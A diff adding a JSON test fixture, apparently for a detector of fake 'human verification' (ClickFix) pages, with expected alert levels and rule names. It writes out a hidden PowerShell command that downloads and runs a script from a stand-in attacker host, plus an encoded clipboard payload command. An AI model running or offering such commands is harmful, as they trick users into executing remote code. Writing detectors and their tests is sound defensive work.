@@ -1,0 +1,21 @@
+[
+  {
+    "name": "ru clickfix powershell",
+    "url": "https://evil.example/ru",
+    "title": "Проверка безопасности",
+    "bodyText": "Подтвердите что вы человек. Нажмите Win+R, вставьте команду и нажмите Enter.",
+    "codeBlocks": ["powershell -nop -w hidden -c \"irm https://evil.example/a.ps1 | iex\""],
+    "expectedMinimumLevel": "high",
+    "expectedRules": ["fake-verification-language", "run-dialog-instruction", "remote-download-execute"]
+  },
+  {
+    "name": "shadow clipboard payload",
+    "url": "https://evil.example/shadow",
+    "title": "Human verification",
+    "bodyText": "Verify you are human. Copy and paste the command.",
+    "shadowText": ["Open PowerShell and run the command to continue"],
+    "clipboardPayloads": ["powershell -w hidden -EncodedCommand SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgApAA=="],
+    "expectedMinimumLevel": "high",
+    "expectedRules": ["shadow-dom-bait", "clipboard-payload-command", "encoded-payload"]
+  }
+]
